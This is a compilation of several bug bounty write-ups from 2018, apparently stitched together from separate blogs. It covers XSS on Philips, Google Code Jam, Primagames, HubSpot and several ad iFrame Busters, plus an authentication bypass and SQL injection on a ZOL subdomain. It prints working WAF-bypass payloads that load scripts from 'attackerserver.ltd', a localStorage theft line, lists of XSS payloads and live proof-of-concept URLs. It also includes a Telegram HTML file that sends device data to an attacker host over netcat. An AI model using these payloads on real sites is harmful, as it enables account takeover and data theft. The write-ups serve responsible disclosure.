reflective or stored attack vectors . I probed all the different parameters in the URLs captured by the Burp Suite; all of them were properly escaped . Good job Philips :-). Below you see an example of a manipulated request that tries to inject <h1>Hi mom</h1> into the page. It got escaped into &lt;h1&gt;Hi+mom&lt;/h1&gt; so the browser won’t try to render it as HTML, just as plain text. Press enter or click to view image in full size Example of a properly escaped variable used in the response. What to do now? Find holes in the server framework itself! To discover which framework is being used by Philips we may use tools like WhatCMS.org . They have created an algorithm that is able to detect 320 different CMS systems ; perfect! Press enter or click to view image in full size Adobe Experience Manager wins the battle. Another way to discover the name of the framework is by taking a closer look at the source code of the main page: Code that refers to adobedtm.com Press enter or click to view image in full size Adobe DTM is part of Adobe Experience Cloud, Adobe Experience Manager is the CMS. Now we know that Adobe Experience Manager (AEM) is used we should start reading as much as possible about this CMS. This gives us some feeling of where to look for the weak spots; what are the best practices, any security updates in the past and are there any hidden functions? Adobe Experience Manager Reading software documentation is a necessity, sometimes boring but often rewarding. Another thing you should always try is to just google on the software and look for blogs or other places where experts share their tricks. We discover something interesting if we do a quick google search for URL parameters. Press enter or click to view image in full size The first hit. Press enter or click to view image in full size A debug parameter exists, it outputs the ‘layout information’ of components. Thanks Feike for sharing! Press enter or click to view image in full size This parameter does exists in the official documentation, they recommend to disable it in production. Adobe even provided a AEM pen testing cheatsheet for us, thanks again! What happens if we visit Philips their website with the /?debug=layout parameter? Press enter or click to view image in full size Woops, they forgot to disable the debug mode. Does the debug mode renders our URL in the page, unescaped ? Press enter or click to view image in full size The URL is being parsed in the page, the URL path is not escaped so we are able to inject HTML! Yes it does! Let’s try some javascript . Press enter or click to view image in full size Mmm. Some WAF is blocking our request. Bypassing the Web Application Firewall (WAF) So we have our point of injection, the URL path combined with the debug=layout parameter. Now we need to find a piece of HTML that bypasses the firewall and executes our javascript. Identify the WAF A quick way to indentify the WAF(s) used by a target is to use WhatWaf . It probes the target with some payloads and compares the outcome with a set of detection rules. Press enter or click to view image in full size Output of WhatWaf if we check www.Philips.com The used WAF is ModSecurity and AkamaiGHost . Bypass ModSecurity and AkamaiGHost This is something I prefer to do by hand. Brute forcing it with the Burp Suite Intruder is possible, but hammering a server with plenty of requests is a bad idea; you will end up on some blacklist. While drinking a good cup of tea we discover that: 1. The WAF blocks the <script> tag 2. The WAF allows the <body> tag 3. The WAF blocks almost all the javascript events (i.e. onerror , onload , onmouseout ), but allows the use of the onpointerenter event. 4. The WAF blocks the string https:// in the path I always check if jQuery is loaded on the page; it allows us to create a smaller payload that works crossbrowser (by using the getScript function). Press enter or click to view image in full size Just run jQuery.fn.jquery in the console. jQuery is loaded if you see a version number. Now it’s time to construct our payload: https://www.philips.nl/healthcare/<body onpointerenter=\"jQuery.getScript('https:/' +'/attackerserver.ltd/philips/inject.js')\">?debug=layout We inject a body tag, that triggers the jQuery getScript function when someone moves their cursor over the page. The getScript function loads our external javascript file and executes the content. We use the 'https:/' +'/attackerserver.ltd' in order to bypass the WAF https:// string filter. We urlencode the payload in order to be sure that the link is valid and easy to send to our victim. Working payload https://www.philips.nl/healthcare/%3Cbody%20onpointerenter=%22jQuery.getScript('https:/'+'/attackerserver.ltd/philips/inject.js')%22%3E?debug=layout Creating a proper proof of concept Everyone knows the <script>alert('XSS')</script> payload as a proof of concept. However we will invest a few more minutes in making a more impressive proof of concept; a fully working phishing login . This is a better way to show the impact to people, everyone understands the impact if they see a fake login screen. In an upcoming report I will explain in detail how to create a proof of concept phishing login within a few minutes. Subscribe to my Twitter or Medium to get updates of any new posts ;-) Bonus: Stealing user details from logged in users Philips uses Janrain for their customer login. Janrain stores the user details in the localstorage of the browser. So we are able to steal the visitor details if one is logged in. Press enter or click to view image in full size Visitor details stored by Janrain in the localstorage This line of javascript is enough to steal the user details of a logged in user: var user = (localStorage.getItem(\"janrainCaptureProfileData\")) ? localStorage.getItem(\"janrainCaptureProfileData\") : \"Not logged in\"; Proof of concept in action Press enter or click to view image in full size Bypassing initial fix The initial fix of Philips was to add a new firewall rule that blocks all the HTML tags. Leaving the debug mode on. However we are able to inject a HTML tag that is missing the > character. https://www.philips.nl/healthcare/ <body%20alt=al%20lang=ert%20onmouseenter=\"top['al'+lang](/PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman/)\"?debug=layout Press enter or click to view image in full size Example of the bypass on lightning.philips.com The server will inject the payload and as you can see the > from the <br> tag will be used to close the body tag. Another nifty trick to bypass a WAF rule that blocks alert() strings: split the string into 2 pieces and add them as attributes to the HTML tag and merge them again in the same tag by using top[attribute1+attribute2] . Solutions The most simple solution is to disable the debug mode; this can be done by configuring the dispatcher used by AEM. The WAF may be improved to disable any the HTML tags in the url or onevent strings, however blacklisting is never a good solution; we will always find a new payload that bypasses the blacklist. Impact of the attack Extra filtration of user information visiting our prepared link Attack the browser of visitors through injection of a framework like beefproject.com Setting up a phishing login Hall of Honors Press enter or click to view image in full size A mention in the Hall of Honors of Philips :-) Timeline 13–07–18 Discovered bug, informed Philips by email 17–07–18 Asked Philips on Facebook Messenger if they received the report 17–07–18 Philips replied email that they received the report 17–07–18 Requested Philips to share the findings with the lighting.philips.com development team, this site is also vulnerable (Signify is the owner of Lighting Philips, a separate company. They share the Philips.com code base but have their own deployment and dev team). 26–07–18 Requested Philips for update, check if they informed Signify 30–07–18 Philips informs me that they deployed a fix on their own site, want to mention me in the Halls of Honors. No answer on Signify question. 30–07–18 Informed Philips that their fix (WAF rule) is not enough, debug mode still possible. 31–07–18 Created new payload that bypasses the new WAF rule, informed Philips. 18–08–18 Requested update; Philips.com looks fixed (no debug mode anymore), lightning.philips.com still vulnerable to both payloads 27–08–18 Requested update from Philips again, no response. 27–08–18 Requested email address of Signify IT Security Manager from a personal contact working at Signify/Philips Lighting. Informed Signify IT Security Manager by email. 28–08–18 Signify confirmed the bug 29–08–18 Philips informed me that they sent the report to the Lighting division but did not receive any response. 06–09–18 Wrote this report, requested update from Signify 07–09–18 Signify informed me that they are busy with the fix 13–09–18 Signify informed me that the fix is deployed, I confirmed the fix, requested to disclose on 17–09–18 16–09–18 Philips informed me that they have no remarks 17–09–18 Published this blog.

So lets start, I was very new to hackerone and I took a random program to start and I started to do some recon by finding the subdomains and different endpoints.When I was looking at different pages inside the website and then I found an endpoint like this: https://example.com/abc/] I thought there is something fishy here and I opened that page but the page loaded normally.Then I looked at the source of the page and at last of the source I founded a commented out string containing the path after the domain. So I tried entering something else in the url path and it displayed as it is in that comment.So I tried closing that comment with a closing comment tag — —><test> and I was successful in closing that comment tag and was successful in inserting other tags so I insert a script tag after that so the final payload become https://example.com/abc/]--><script>alert(1)</script> and boom! xss executed! So in this way I was able to execute xss on that page.Later I realised that this was on every page of that domain and every path of that particular domain had a commented out string containing whatever in the url path was, so xss was executing on every page of that domain. Reported : 26/05/2018 Bounty : $100 Thanks for reading! I will post my more interesting findings here.

Also, it seems like you have to open the homepage ( https://codejam.withgoogle.com/2018/challenges/ ) at least once before visiting other pages there. POC: https://codejam.withgoogle.com/2018/challenges/0000000000007766/scoreboard/for/ %3Cimg%20src=x%20onerror=alert(document.domain)%3E CSP: Due to CSP, this XSS will fire only in browsers where CSP is not supported (e.g. IE). If we could somehow find a way to execute a script that has inserted dynamically, we could bypass (thanks to gstatic.com ) the CSP using the following payload.

Me Back with a New Post This One is about an Authentication Bypass Vulnerability in one of the subdomains of https://zol.co.zw/ ZOL Zimbabwe and Then got an XSS following with an SQLi in that Control Panel. So The Main Focus of this Blog Post will be on How i got access to the CP and then How i Got the XSS Following the SQLi So fast Forward I got a Subdomain of the site that was http://psizimll2.zol.co.zw/ and the Subdomain was Showing the Default IIS7 Page Like in the Picture Below So At First I started testing this Subdomain for 2 Of the Most Common issues Found in IIS7 1) Microsoft IIS Tilde Vulnerability (And the Site was Vulnerable to this issue) 2) HTTP.sys DOS & possible RCE but after testing these Common Issues on the subdomain i got nothing and decided to dig deeper. So i searched the subdomain on Google to see if there is any information about this particular subdomain (Most of the time a simple google search gives you some files or folders ) But negative i got nothing i did go through virustotal & Some other webs like web archive to get some information but nothing. After this the next phase of my testing was to use DirBuster & DirScanner to test Further for any possible Files/Folders and after a while i got Some URLs Like http://psizimll2.zol.co.zw/test.php http://psizimll2.zol.co.zw/info.php http://psizimll2.zol.co.zw/cp.php The 2 Pages test.php and info.php were both leaking Some Information Through phpinfo(); Pages So At this Point i had 2 Issues in that Subdomain…. Now When Ever I went to the URL http://psizimll2.zol.co.zw/cp.php i got redirected to the main page of the subdomain that was http://psizimll2.zol.co.zw/ So as Many of you guys know about some redirect based techniques, Like This NoRedirect one i added the URL cp.php to the FireFox Extension called NoRedirect and Then When i went to the URL http://psizimll2.zol.co.zw/cp.php it did;t redirected me to http://psizimll2.zol.co.zw/ and i had Access to http://psizimll2.zol.co.zw/cp.php that looked like a Control Panel for some sort of webapp that have some users data in it. Now I searched for Some Data and it was a User Information Database of some sort while searching In It I got another Page that was http://psizimll2.zol.co.zw/dnpc.php and this Page got data of users function where i can search user data from particular dates while searching a POST request was send to the file /dnpc.php with post data as Submit2=Go&end_dt1&start_dt=10 And I saw that the anything that we add to the perimeters end_dt or start_dt was reflecting back in the page under a <th></th> tag so i added a simple Image XSS Payload and it was reflected to me under the <th></th> tag and the XSS payload was executed And I would Like to Mention That due to some error the Search Input was Saved on this Page so It became a Stored XSS 🤣 Now It was getting Bored So i Decided to Write the Report to the team and suddenly decided to look for One last issue that can make the report look better So at the same Endpoints in the same POST request as Above i simply changed searched for 1′ Submit2=Go&end_dt1&start_dt=10 as I started looking for an SQL Injection Issue aND boom the Response for this request gave me an Error Could not get htccc data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line 1 And So I did Exploit this issue to Get the Basic Info and Tables and then i was Convinced i should Stop Further Tests on this Subdomain and Report the issue Furthermore the ZOL team Patched these Issues by Deleting files and Blocking access to the Subdomain 👏 Thanks for Reading this guys 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading...

Friendly 5 min read · Aug 13, 2018 -- 4 Listen Share For those asking me what this Tweet and this Tweet is about — then I will be explaining it here in details as much as possible. For this XSS, you’d want to have Kali Linux, KNOXSS, a SVG that contains an XSS and the basic understanding of how email rendering is displayed on users, admins and client side in email, ticket supports and on the web page. If you do not have an SVG that contains an XSS, then I’d highly recommend you use the one I will provide: Make a file name called: SVG.svg — then edit the file name and paste the following code inside of it and then save it: <svg version=\"1.1\" baseProfile=\"full\" xmlns=\" http://www.w3.org/2000/svg \"> <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> <script type=\"text/javascript\"> alert('XSS!'); </script> </svg> Very basic stuff. [Well done, you have an SVG that contains an XSS!] Steps to Reproduce: First XSS is from https://bugcrowd.com/hubspot — although they only reward points and hall of fame. Even though this isn’t something you guys care about other than the 💰 [money], but this is a good stepping stone to learn about security. To do this you’d need an account on: http://hubspot.com to test on. First, we go to https://app.hubspot.com and then edit our signature: First thing I do and see is an input field. I tried my very basic payloads, which are: \"><svg/onload=alert(1)> <img>/><svg/onload=alert(1)> \"></\\/\\</script><script>alert(1)</script> \"><script>alert(\"xss\");</script> <div onmouseover=\"alert('XSS');\">Hello :) ^ [My favorite one - works like 80% of the time for me]. </style><script>a=eval;b=alert;a(b(/XSS/.source));</script> That's all for now that I'll share. Enjoy the payloads too. ;) However, NONE of them worked sadly in this case and on this website. 😦 I did notice that were was an IMAGE icon there though. So I clicked it and saw my SVG being visible, and was able to being uploaded. I clicked my SVG and uploaded it. The SVG was then uploaded directly to the server and wasn’t filtered at all. So I went to the direct link where my IMAGE SVG was and we got our XSS. Awesome. SVGXSS — Nice. 😁 Some of you may stop here — However, I didn’t stop here. I wanted to go a step beyond that a step further and maybe do more for a bigger impact. This other step: “Requires” Kali Linux [You can skip this part if you’re not interested in Kali Linux]. I booted up Kali Linux and then I created a file name: \"><svg onload=alert(1)>.svg Then I put my XSS inside of it and saved it. After doing that, I uploaded it on the server. The file name did not change at all on the location it was being uploaded to. However, I didn’t get my XSS. So I changed the file name to: \"><svg onmouseover=alert(1)>.svg Then I hovered over it and BAM. 😉 Press enter or click to view image in full size Successfully got the mighty confirmation alert 1. Now, if we visit that file link itself — we should get our confirmation. Press enter or click to view image in full size Our magical confirmation alert— “Friendly”. Ha. And that being included, it shows our SVG. So if you’d right click “Open image in new tab”, you will be taken to the SVG which contains our XSS as well. [ Thanks again KNOXSS here for providing insight, a powerful payload and bypass. ] Basically, TWO XSS in one page. Reward: Points. — Yuck. Finally, XSS via chat module with an email XSS. This method was discovered by me [ Friendly ] and it works 70% of the times from the websites I’ve come across in my last 24–72 hours when I was testing with numerous websites with various chatting module systems like this one. POC: Press enter or click to view image in full size Our beautiful XSS. [ The black box is just covering the website I’m chatting on. ] I tried sending the payload itself without going to the email area, but unfortunately I got no XSS. So I’ll explain why it works this way with some live support chat modules. If this makes any form of sense to you, or helps you in the long run, then be sure to let me know on Twitter by Tweeting at me. The main question is, why does it work like that and how does it work? It’s quite simple. As soon as you input a payload inside the email field such as: x@x.com<--`<img/src=` onerror=alert(\"Friendly-XSS\")> --!> or <--`<img/src=` onerror=alert(\"Friendly-XSS\")> --!> then send another payload similar to it will automatically register on the admins side which will then execute. HOWEVER! It will show it’s not registering on your side which is fine, so that means you will need to send the same payload in order for it to execute. POC is provided above and on what this means. The site Hubspot did NOT reward me for this, however a private Freelancing website did and I grateful for the reward $450 bounty reward. Now which site did I get a reward from? That’s a freelancing website and there’s tons of websites out there that does offer freelancers bounties for their free time. There’s tons that you can find and look for on your own and get a reward for if you Google and looked around.

However in this post, I will explain to my best knowledge on how KNOXSS plays a role here, how I got a blind XSS through a self XSS and a reflected XSS. If you message me on Twitter for help, then I will try my best to assist you! But regarding this website will be a straight NO. My reason is simple for that: I do not want to break their privacy nor lose my contact with them, or any other future bounties this website has to offer me. I don’t expect this to work for everyone, or some of you since each websites WAF security is different than-one-and-another — and how it works. Now to the fun part: To XSS yourself on this website was the most trickiest part and difficult part. When I tried to input the following tags : \", ', ><, / and \\ — I saw that they were being filtered in their live support chat and wasn’t being rendered in at all. After spending 20 - 30 mins, I tried some HTML entities and I saw my outputs being rendered in regular tags, so I decided to cook up an image tag XSS. That being said, I used the following HTML entities: &quot;&gt;&lt;img src=x onerror=alert(1);&gt; and my output became \"><img src=x onerror=alert(1);> which then gave me this: OUR MAGICAL CONFIRMATION “1” :D Then their live support team member messaged me saying: “Hey did you send a popup box with a message saying “1”, and I responded with “Yes I did.” That moment I knew I had a blind XSS which reflects back into their Admin Panel. So I quickly cooked up another payload to grab their cookies — the big boys cookies. That moment I knew I had access to their Administrators and Devs account. I swiftly contacted them and their Administrators again and I was asked me if I could login as them and give a proof of concept — which I did. Logged in and changed their names to my name for a bit more proof of concept. They were shocked. They asked me for my PayPal to send me a lil something, something. ;) I was awarded $500 for this with the reason “Security Guy.” Ha. However, I didn’t stop there. Next part is using KNOXSS and Sublist3r — I used Sublist3r which helped me locate and able to find all their subdomains. I found one of their subdomain http://search.websitename.com which wasn’t listed on their website at all and it wasn’t secured at all. Just had a search box, a bunch of outdated information. First I tried \"><svg/onload=alert(1)> and I got no alert. Which was a bummer. I tried every single possible payload I could think of and got no result. So I went to KNOXSS and posted my POST DATA and saw something interesting which was %3E%3CScrip%3E being rendered in the URL as ></Script> . So I did a quick Google and found a payload that was similar to something I was using, and that payload was: 1%3C!%27/*%22/*\\%27/*\\%22/* — %3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm1%20//%3E# I input that in my URL with my POST DATA and got my little confirmation 1. I quickly contacted their Administrators and Devs and explained how dangerous this can be and how bad it could be. They agreed with me and quickly took down that subdomain. I was then rewarded $200 for a reflected XSS and with a little reason: “Try to reflect this back.” They have a great sense of humor. Ha. Total bounty for the day: $700 USD If you have any questions or comments, feel free to message me on Twitter, or tweeting me @Skeletorkeys Thank you for reading and I hope this is informative enough and I do apologize for not sharing that domain with you all. Again, this isn’t my choice it’s the websites choice and I respect that and I hope you guys do as well. I probably used some terms wrong too. Heh. Anyways, thanks for reading.

I have decided to do a full disclosure regarding this. You have a reflected XSS vulnerability located at this domain: https://shop.primagames.com/us/search?p= This was tested on the latest version of Firefox 61.0.1 (64-bit). By entering this payload in the URL, you are able to execute a script (XSS): <img/on=><img/onerror=%27confirm(1)%27src=%23> Press enter or click to view image in full size …. We get the famous confirm(1) to popup! Impact: This allows an attacker to inject custom Javascript codes that can be used to steal information from Primagames’s user base and lure them to malicious websites on the internet on behalf of Primagames’s website. Once again, this post is NOT meant to do anything harmful to the website. I am just a security researcher who is trying to help secure your website — other websites as well. I hope you see this post and fix your issue very soon and secure your users. If you have any questions or comments, feel free to message me on Twitter @Skeletorkeys Thanks for reading.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS Vulnerabilities in Multiple iFrame Busters Affecting Top Tier Sites - Randy Westergren September 17, 2018 XSS Vulnerabilities in Multiple iFrame Busters Affecting Top Tier Sites For those unfamiliar with modern advertising tech, iFrame Busters are HTML files hosted on publisher sites which allow ad creatives to extend outside of their standard boundaries. These expandable creatives are typically easy to identify on a site — usually the most annoying ads shown on a page. Background The ad tech industry is quite fragmented and processes can differ greatly between vendors. While a complete explanation of ad network delivery is beyond the scope of this post, a basic example will help illustrate how iFrames and iFrame Busters are often used with expandable creatives. As an example, a simple (non-expanding) creative being delivered on a publisher’s page is shown below: Note the src attribute of the iFrame points to the advertiser’s domain which embeds the desired creative. Nothing special here — this is exactly how any other externally pointing iFrame would function. Also, notice the iFrame’s size is restricted to 300×250 — a standard ad slot size. The ad cannot extend display beyond its frame size, nor can it manipulate the DOM in the top-level page due to same-origin policy . In order to work around this and allow a specific ad vendor to bypass SOP, vendor iFrame Busters (special HTML files) are often provided to be hosted on a publisher’s domain. A simple iFrame Buster ( buster.html ) might look like this: <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"> <html> <body> <script type=\"text/javascript\" language=\"javascript\"> var _url = \"http://www.domain.com/bust.js?\" + document.location.search; var _script = document.createElement(\"script\"); _script.setAttribute(\"type\", \"text/javascript\"); _script.setAttribute(\"src\", _url); document.body.appendChild(_script); </script> </body> </html> An example publisher page ( index.html ) eventually embedding the above iFrame Buster is below: <html> <head> <title>Example Host Site</title> <base href = \"https://hostsite.com\" /> </head> <body> <div id=\"content\"> Test Example </div> <div id=\"banner_ad\"> <!-- Step 2: Initial external creative ad is rendered --> <iframe src=\"//ad-creative.com/showad.html?expandable=1&foo=bar\"> <!-- External ad vendor creative (banner ad) typically rendered here --> <!-- Step 3: Expandable ad placement identified, redirect to https://hostsite.com/buster.html?params=here --> </iframe> </div> </body> <script> // Step 1: Ad Vendor bidding/creative logic adObj.init(\"banner_ad\"); </script> </html> As you can see in step 3, the iFrame embedding the initial ad is redirected to the host page’s domain where the buster.html file resides. The buster file then has access to the parameters provided in the URL from the redirection, referencing them for the behavior of the specific ad impression. As noted above, iFrame Busters are vendor-specific — this means a given publisher may be asked to host a multitude of third-party HTML files to support expandable functionality. In fact, until recently, Google provided a multi-vendor iFrame Buster kit for download within their DoubleClick AdExchange documentation . Vulnerabilities After Google initially announced the recommended removal of several busters in their kit from publisher domains, I decided to review some of the remaining busters as well as the more popular ones not used by DoubleClick. I identified DOM-based XSS vulnerabilities in most of these busters and, though I won’t walk through every one of them, I wanted to cover a few of the more interesting examples in this post. Adform IFrame Manager (1.7.48) I’ll begin with an older version of Adform as a simple example. The relevant source is below: /* Adform.IFrameManager.js, version 1.7.48 Copyright Adform http://www.adform.com Date: 2016-08-24 13:50:17 */ (function(c, b) { if (!b.CACHE) { c.ADF_STUB = !0; var a = location.hash.split(\"#\"), a = 2 < a.length ? a[2] : a[1].split(\"%23\").slice(1).join(\"%23\"); if (!/^(https?:|)\\/\\/(?:[^\\/]+?\\.)(adform|adformdsp)\\.(com|net|local)(\\/|$)/i.test(a)) throw Error('Invalid \"host\"'); b.document.write('<script src=\"' + a + '\">\\x3c/script>') } })(Adform = window.Adform || {}, window); As you can see, this buster simply accepts a source URL that will be written out to the DOM as an external JavaScript source. The related regex test above is attempting to whitelist the allowed domains from which the passed script source URLs will originate. Breaking the regex down, we can see the URL must start with “https://” and end with “{almost_anything}.adform.com” — with the exception of forward slashes, any other characters are allowed in between. Due to this poor restriction, bypassing the whitelist is easy for an attacker. For example, to embed an attacker script instead, we could use: https://hostsite.com/adform/IFrameManager.html##https://randywestergren.com\\iframe-buster-poc.js?test.adform.com This satisfies the regex rules using a GET parameter (test.adform.com) and a malformed URL path (backslash rather than forward). As you’ll see in the following examples, most of the identified vulnerabilities follow a similar pattern of weak whitelist implementations. Eyeblaster (Add in Eye) The addineye iFrame Buster is still seen live on numerous top tier sites. Since the full source code is a bit lengthy, I’ll include it in a gist here . The vulnerability is found in _prepareVerificationJsonObj where a JSON object is prepared from the attacker-controlled document.location.search string: /* Snipped for brevity */ _prepareVerificationJsonObj: function(strHtml) { var strObj = {}; var arrData = strHtml.split(\"::\"); strObj.addineyeDomain = arrData[0] ? arrData[0] : \"\"; strObj.ebBs = arrData[1] ? arrData[1] : \"bs.serving-sys.com\"; strObj.ebProtocol = arrData[2] ? arrData[2] : \"http://\"; return strObj; } _handleAddIneyeVerification: function(strHtml) { var myAddInEyePos = strHtml.indexOf(\"strAie\"); var strAddInEye = \"\"; if (myAddInEyePos != -1) { myAddInEyePos += 6; strAddInEye = strHtml.substr(myAddInEyePos); strAddInEye = unescape(strAddInEye); addInEyeObj = this._prepareVerificationJsonObj(strAddInEye); this._sendAddInEyeVerificationToServer(addInEyeObj); } } _sendAddInEyeVerificationToServer: function(addInEyeObj) { var addineyePipe = \"\"; if (addInEyeObj) { addineyePipe = addInEyeObj.ebProtocol + addInEyeObj.ebBs + \"/BurstingPipe/adServer.bs?cn=dmvld&dm=\" + addInEyeObj.addineyeDomain; document.write(\"<scr\" + \"ipt src='\" + addineyePipe + \"'></scr\" + \"ipt>\"); } } Follow the JSON object eventually passed to _sendAddInEyeVerificationToServer and see it’s derived from a double-colon delimited string found in the strAie query string parameter. As you can see, an arbitrary domain and path can be set within _prepareVerificationJsonObj without a whitelisting check. A few full (and live) PoC URLs look like this: http://www.cnn.com/eyeblaster/addineyeV2.html?strBanner=1&strAie::randywestergren.com/iframe-buster-poc.js?::https:// https://www.fandango.com/eyeblaster/addineyeV2.html?strBanner=1&strAie::randywestergren.com/iframe-buster-poc.js?::https:// https://www.forbes.com/eyeblaster/addineyeV2.html?strBanner=1&strAie::randywestergren.com/iframe-buster-poc.js%3f::https:// Adtech Adtech has another interesting example of a whitelist weakness. Here is the source code: var allowed_domains = ['adserver.adtech.de', 'adserver.adtechus.com', 'aka-cdn.adtech.de', 'aka-cdn-ns.adtech.de', 'pictela.net' ]; try { var adtechIframeHashArray = self.document.location.hash.substring(1).split('|ifv|'); var domain = adtechIframeHashArray[0].match(/https?:\\/\\/([^:^\\/]*)/i)[1]; for (var d in allowed_domains) { if (allowed_domains[d] == domain) { document.write('<scr' + 'ipt type=\"text/javascript\" src=\"' + adtechIframeHashArray[0] + '\"></scr' + 'ipt>'); break; } } } catch (e) {} In this implementation, the code first attempts to extract the domain from the passed script URL and determines if it exists in the allowed_domains whitelist array. The weakness in the regex may not be easy to spot at first, but notice how it considers anything before a colon as the parsed domain. To bypass this, an attacker simply needs to satisfy the whitelist while making the browser actually request a file from another source. This can be done by providing embedded basic authentication credentials in the URL. An example live PoC: http://www.ticketmaster.co.uk/adtech/iframeproxy.html#https://adserver.adtech.de: [email protected] /iframe-buster-poc.js?test.adform.com|ifv| Please note this PoC will not work in Chrome since embedded credential support has been blocked since version 59 — although it still works in most other browsers, including Firefox. Jivox A final example of an iFrame Buster with a different kind of weakness resulting in XSS. The relevant source: var parameters = {}; function getValueWithDefault(key, input, defaultValue) { if (input != null && array_key_exists(key, input)) return input[key]; return defaultValue; } function array_key_exists(key, search) { return (typeof search[key] != \"undefined\"); } function initIBuster() { try { var queryString = unescape(document.location.search.substr(1)); var queryParameters = queryString.split('&'); for (var i = 0; i < queryParameters.length; i++) { var keyValue = queryParameters[i].split('='); parameters[keyValue[0]] = keyValue[1]; } var iBusterResourceURL = getValueWithDefault(\"iBusterResourceURL\", parameters, \"\"); iBusterResourceURL = iBusterResourceURL.split(\".\"); var filePath = getValueWithDefault(\"filePath\", parameters, \"\"); document.write(unescape('%3Cscript src=\"' + iBusterResourceURL[0] + '.jivox.com/player/' + getValueWithDefault(\"iBusterVersion\", parameters, \"\") + '/iBuster.js\" type=\"text/javascript\" %3E%3C/script%3E')); } catch (e) {} } initIBuster(); As far as an attacker is concerned, the important variable that we want to control is the iBusterResourceURL which is ultimately used to populate the script tag’s src attribute. The parent domain is already provided in the string writing to the DOM — this means we just need to sneak our own legitimate URL before this string is appended while making the rest irrelevant to the actual request. Importantly, there is also a split occuring on period characters, meaning the first subdomain of the passed URL is what the code’s author had anticipated receiving. Also, notice there is an unescape called before the document.write . This means we can use double-encoding to satisfy both of these conditions to bypass the restriction: https://www.foxnews.com/jivox/jivoxIBuster.html?iBusterResourceURL=https://randywestergren%252Ecom/iframe-buster-poc%252Ejs%23 Which, after URL decoding, makes the iBusterResourceURL value: https://randywestergren%2Ecom/iframe-buster-poc%2Ejs# And finally, after the unescape : https://randywestergren.com/iframe-buster-poc.js# The hash (fragment identifier) at the end makes the remaining hard-coded characters ineffective at controlling the URL. Disclosure I prepared a report detailing the additional vulnerable busters and submitted it to Google’s security team. They responded quickly, confirmed the vulnerabilities, and removed the files. Although it didn’t qualify for a reward, they did add me to their Hall of Fame . Here’s the timeline: 2018-01-03 Initial report to Google 2018-01-04 Report accepted 2018-01-05 Discussion/clarification on specific vendor 2018-01-16 Marked fixed by Google Best Practices Using regular expressions with whitelisting logic can be risky and difficult. If domain parsing/whitelisting is needed in JavaScript, a better solution is to use the DOM API: var e = document.createElement(\"a\"); e.href = \"https://randywestergren.com/test?test123\"; e.hostname; // => \"randywestergren.com\" Share this: ↑ Home About Proudly powered by WordPress | Theme: Fastr by Kanishk ."}

Written by omespino July 16, 2018 January 7, 2022 WRITE UP – TELEGRAM BUG BOUNTY – WHATSAPP N/A [“Blind” XSS Stored iOS in messengers twins, who really care about your security?] Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about Telegram/Whatsapp bug bounty that is very great because this was my first Bitcoin bug bounty payment : This blogpost appeared first in the book Bug Bounty Write Ups Collection [Note] the vulnerability was exactly the same so [It was accepted by Telegram but marked as N/A by Whatsapp (Facebook Whitehat team) ], I just going to describe the process once, also I called “Blind” XSS stored because I couldn’t get a popup alert, but the javascript code rendered anyway. Title: Blind XSS Stored on Telegram app (iOS) via html file. Product / URL: ​ Telegram iOS app Description and Impact​: ​The attackers can store and render arbitrary HTML/Javascript code via HTML file in the background since Telegram iOS doesn’t sanitize any code in the webview inside the app. In this case the impact is: – The attacker can know when the user read the message and when was the last user online activity even if is “last seen” and “read receipts” are turned off. – The attacker can fingerprint the user device with navigator object that contains interesting info from the user device, iOS version, iOS device, language – The attacker can get the victim IP and at least know what is current user city location with any service online like https://www.elhacker.net/geolocalizacion.html POC: 1.- “As attacker”: Login to your Telegram account in any client and upload a html file with the following content and send it via message (ggwp.htm file attached): ggwp.html file content (transcript): <!-- script that load a firebug lite version to get the webview debuggin console inside the app --> <script src='https://getfirebug.com/firebug-lite-debug.js'></script> <script> // iterating the navigator object that contain interesting info from the user device, iOS version, iOS device, language var nav = {}; for (var property in navigator) { nav[property] = navigator[property]; } // tracking when the user open the file with the date var d = new Date(); var nav_formated = '<pre><h1>'+ document.location + '</h1><h2>' + d + ','+ JSON.stringify(nav, null, 2) + '</h2><pre>'; // writting the results document.write(nav_formated); // send data to the 'attacker server' send_response(nav_formated); function send_response(response){ var o_req = new XMLHttpRequest(); o_req.open('POST','http://192.168.1.120:8090'); o_req.send(response); } </script> 2.- Run the “attacker server” and wait for the victim open the file (in my case was my own computer in my lan with the IP 192.168.1.120 and run the server with nc -lvvv 8090) 3.- “As victim”: open the file in Telegram iOS and see the results that the victim just sent to the “attacker sever” – The document.location – The navigator object Note: Also you can notice that the Firebug lite debug console renders without any problem and is fully functional. 4.- “As attacker”: see the results caught in the “attacker sever” Environment: iPhone 6 – iOS v11.2.5. iPhone 7 – iOS v11.2.6 Telegram iOS app Version 4.7.1 My personal account and the server was “hosted” in my own LAN. Tools: Any unix like terminal with​ netcat installed Is this bug public or known by third parties?​: No​ Can I reproduce this issue every time? Yes How did I find this bug? Manually / Other Summarizing , this clearly demonstrates how these companies manage this kind of vulnerabilities, in the one hand Telegram demonstrates actually how they worry about the user fingerprinting and Facebook demonstrated that don’t care. PS. here part of my conversation with Facebook whitehat team. Timeline: 22 Mar 2018: Initial report (Both platforms) 26 Mar 2018: Telegram Security team member send me a response: “Thank you very much for taking an interest in what we do and finding this issue. It will be fixed in the upcoming release. We would like to award you with a bounty of EUR **** for helping us identify it. I’m cc-ing ******* who will help you collect. “ 26 Mar 2018: Facebook Security team member ask me for more details. 26 Mar 2018: I replied Facebook Security team with more details. 29 Mar 2018: Facebook Security team closed as N/A. 10 Apr 2018: I got the Bitcoin transfer from Telegram Security team. [Profit] sometime in July 2018: Telegram iOS app fixed so I decided to make public this patched vulnerability. well that’s it, share your thoughts, what do you think about how they handle that security issue? if you have any doubt, comments or suggestions just drop me a line here or on Twitter 